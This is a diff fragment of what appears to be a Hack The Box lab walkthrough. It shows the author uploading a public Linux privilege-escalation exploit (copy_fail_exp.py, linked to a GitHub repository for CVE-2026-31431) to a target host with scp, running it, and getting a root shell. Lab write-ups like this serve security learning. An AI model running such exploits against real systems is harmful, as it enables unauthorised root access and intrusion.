@@ -671,6 +671,29 @@ Ill upload linpeas to the target with scp
 
 Im going to upload copyfail 
 
+github.com/theori-io/copy-fail-CVE-2026-31431
+
+# Root on SSH
+
+```python
+scp copy_fail_exp.py svc@dc01.fries.htb:/tmp 
+svc@dc01.fries.htb's password: 
+copy_fail_exp.py
+```
+
+Ill trnasfer the exploit to the target
+
+```python
+svc@web:/tmp$ python3 copy_fail_exp.py
+# 
+# 
+# whoami
+root
+# 
+```
+
+I am now root!
+
 
 
 
